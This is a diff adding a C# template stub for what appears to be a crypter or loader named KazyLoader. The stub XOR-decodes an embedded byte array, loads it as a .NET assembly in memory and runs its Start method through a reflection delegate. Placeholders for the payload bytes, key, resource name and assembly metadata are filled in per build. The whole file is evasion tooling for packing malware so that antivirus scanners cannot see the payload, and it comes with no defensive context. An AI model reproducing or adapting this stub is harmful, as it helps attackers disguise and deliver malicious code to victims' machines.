@@ -1,0 +1,35 @@
+using System;
+using System.Text;
+using System.Reflection;
+
+%ASSEMBLYINFO%
+
+namespace Loader
+{
+    static class Program
+    {
+		static byte[] ll = new byte[] { %LOADERBYTES% };
+		delegate object inv(object inst, object[] arg);
+
+        static void Main(string[] args)
+        {
+			Assembly a = Assembly.Load(Encrypt(ll, "%KEY%"));
+			MethodInfo inf = a.GetType("KazyLoader.Loader").GetMethod("Start");
+			Delegate d = Delegate.CreateDelegate(typeof(inv), inf, "Invoke");
+            d.DynamicInvoke(new object[] { null, new object[] { "%RESNAME%", "%NAMELOC%", "%KEY%", args } });
+        }
+
+        static byte[] Encrypt(byte[] data, string pass)
+        {
+            byte[] key = Encoding.Unicode.GetBytes(pass);
+            int kind = 0;
+            for (int i = 0; i < data.Length; i++)
+            {
+                data[i] = (byte)(data[i] ^ key[kind++]);
+                if (kind == key.Length)
+                    kind = 0;
+            }
+            return data;
+        }
+    }
+}
